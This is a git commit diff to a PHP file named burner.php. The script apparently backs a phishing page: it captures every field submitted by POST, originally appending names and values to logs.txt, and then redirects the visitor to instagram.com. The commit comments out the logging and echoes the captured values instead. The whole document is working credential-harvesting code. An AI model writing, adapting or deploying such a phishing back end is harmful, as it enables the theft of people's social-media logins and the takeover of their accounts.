17df988ef0cfbe1df4181e0b6c536a7ef752853d
jitendra Gurjar <jitgurjar079@gmail.com>
2019-05-29 18:08:49 +0530

    Update burner.php

--- burner.php
+++ burner.php
@@ -2,13 +2,15 @@
 header ('Location:https://instagram.com');
 $handle = fopen("./logs.txt", "a");
 foreach($_POST as $variable => $value) {
-   fwrite($handle, $variable);
+   
+   echo $variable ." " . $value;
+  /* fwrite($handle, $variable);
    fwrite($handle, " = ");
    fwrite($handle, $value);
-   fwrite($handle, "\r   \n");
+   fwrite($handle, "\r   \n"); */
 }
-fwrite($handle, "\r   \n   \n");
-fclose($handle);
-exit;
+//fwrite($handle, "\r   \n   \n");
+//fclose($handle);
+//exit;
 
 ?>
